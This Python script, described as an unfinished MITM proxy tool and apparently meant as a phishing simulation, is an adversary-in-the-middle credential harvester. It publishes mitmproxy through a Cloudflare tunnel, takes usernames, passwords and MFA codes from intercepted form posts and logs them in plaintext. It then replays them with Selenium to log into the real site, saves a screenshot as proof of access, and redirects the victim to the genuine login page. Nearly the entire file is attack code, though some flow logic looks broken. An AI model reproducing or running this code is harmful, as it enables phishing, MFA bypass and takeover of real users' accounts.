######################################################################################################################################################################################################################
# Intial mitm proxy tool. python mitm_proxy_tool.py. !!!Under-Constuction!!!  
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#######################################################################################################################################################################################################################

import subprocess
import logging
import time
import sys
from mitmproxy import http
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Setup logging
logging.basicConfig(level=logging.INFO)
log = logging.getLogger("PhishingSimulation")

# Constants
MITMPROXY_PATH = "mitmproxy"  # Using the relative path (assuming mitmproxy is installed globally)
CAPTURED_DATA_PATH = "/home/username/captured_data"  # Adjust path for capturing data
PROXY_ADDRESS = "example.cloudflare-tunnel.com:8080"  # Cloudflared tunnel address

# Function to check and install dependencies
def install_dependency(package, install_command):
    try:
        subprocess.run([package, "--version"], check=True, stdout=subprocess.PIPE)
        log.info(f"{package} is already installed.")
    except subprocess.CalledProcessError:
        log.info(f"{package} not found. Installing...")
        subprocess.run(install_command, check=True)

# Install mitmproxy
install_dependency("mitmproxy", ["pip", "install", "mitmproxy"])

# Install selenium
install_dependency("selenium", ["pip", "install", "selenium"])

# Install cloudflared if not installed
def install_cloudflared():
    try:
        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.PIPE)
        log.info("cloudflared is already installed.")
    except subprocess.CalledProcessError:
        log.info("cloudflared not found. Installing...")
        subprocess.run(["apt", "install", "cloudflared", "-y"], check=True)  # Using apt for Linux

install_cloudflared()

# Function to start mitmproxy and capture traffic
def start_mitmproxy():
    log.info("Starting mitmproxy to capture traffic...")
    try:
        subprocess.run([MITMPROXY_PATH, "--listen-port", "8080"], check=True)
        log.info("mitmproxy is running and capturing traffic.")
    except subprocess.CalledProcessError:
        log.error("Failed to start mitmproxy.")
        sys.exit(1)

# Function to capture the credentials from mitmproxy traffic
captured_credentials = {}

def request(flow: http.HTTPFlow):
    # Capture username and password from form submissions
    if "username" in flow.request.fields and "password" in flow.request.fields:
        username = flow.request.fields["username"]
        password = flow.request.fields["password"]
        captured_credentials["username"] = username
        captured_credentials["password"] = password
        log.info(f"Captured credentials: {username}, {password}")

    # Optionally capture MFA if it exists
    if "mfa_code" in flow.request.fields:
        mfa_code = flow.request.fields["mfa_code"]
        captured_credentials["mfa_code"] = mfa_code
        log.info(f"Captured MFA code: {mfa_code}")

# Function to login to the real website using captured credentials
def login_to_real_website(driver, username, password, mfa_code=None):
    log.info("Logging into the real website with captured credentials...")
    real_site_url = "https://real-site.com/login"  # Real site login page URL
    driver.get(real_site_url)

    # Wait for the username field to be visible
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "username")))  # Adjust for real site's field name

    # Enter the captured credentials
    driver.find_element(By.NAME, "username").send_keys(username)  # Adjust field name if necessary
    driver.find_element(By.NAME, "password").send_keys(password)  # Adjust field name if necessary

    # If MFA is required, enter the captured MFA code
    if mfa_code:
        driver.find_element(By.NAME, "mfa_code").send_keys(mfa_code)  # Adjust field name if necessary

    # Submit the login form
    driver.find_element(By.NAME, "password").send_keys(Keys.RETURN)

    # Wait until login is successful (adjust the condition based on the site's behavior)
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "profile-menu")))  # Adjust for real site's login success indicator

    log.info("Successfully logged into the real website.")

# Function to capture a screenshot after login to prove access
def capture_screenshot(driver):
    timestamp = time.strftime("%Y%m%d-%H%M%S")
    screenshot_path = f"/path/to/screenshots/screenshot_{timestamp}.png"  # Modify as needed
    driver.save_screenshot(screenshot_path)
    log.info(f"Screenshot captured: {screenshot_path}")

# Function to log out of the real website
def logout_of_real_website(driver):
    log.info("Logging out of the real website...")
    # Wait for profile menu (or another element that signifies the user is logged in)
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "profile-menu")))

    # Click the logout button (modify selector based on the real site's button)
    logout_button = driver.find_element(By.XPATH, "//button[@id='logout']")  # Adjust for the real site's button
    logout_button.click()

    # Wait for confirmation of logout (modify condition based on real site behavior)
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "login-form")))

    log.info("Successfully logged out of the real website.")

# Function to redirect the user to the real site's login page
def redirect_user_to_real_site():
    log.info("Redirecting user to the real login page...")
    redirect_url = "https://real-site.com/login"  # Real site login page URL
    subprocess.run(f"xdg-open {redirect_url}", shell=True)  # Linux open command to launch browser

# Main function to run the entire process
def run_phishing_simulation():
    # Start mitmproxy to capture traffic
    start_mitmproxy()

    # Start Cloudflared tunnel to expose mitmproxy to the internet
    log.info("Starting Cloudflared tunnel to expose mitmproxy to the internet...")
    subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:8080"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Start browser automation with Selenium for the real login attempt
    log.info("Starting browser automation for the attacker machine...")
    options = Options()
    options.add_argument("--headless")  # Run in headless mode
    options.add_argument(f'--proxy-server=http://{PROXY_ADDRESS}')  # Use Cloudflared proxy server

    # Launch Selenium WebDriver with Chrome
    driver = webdriver.Chrome(options=options)

    # Wait for traffic to be captured
    log.info("Waiting for user credentials to be captured...")
    time.sleep(5)  # Adjust time as needed for traffic to be captured

    # Capture the credentials
    username = captured_credentials.get("username")
    password = captured_credentials.get("password")
    mfa_code = captured_credentials.get("mfa_code")

    # Ensure credentials were captured
    if not username or not password:
        log.error("Failed to capture credentials.")
        sys.exit(1)

    # Log in to the real website using captured credentials
    login_to_real_website(driver, username, password, mfa_code)

    # Capture a screenshot after successful login
    capture_screenshot(driver)

    # Log out of the real website
    logout_of_real_website(driver)

    # Close the browser
    driver.quit()

    # Redirect user to the real site's login page
    redirect_user_to_real_site()

if __name__ == "__main__":
    run_phishing_simulation()
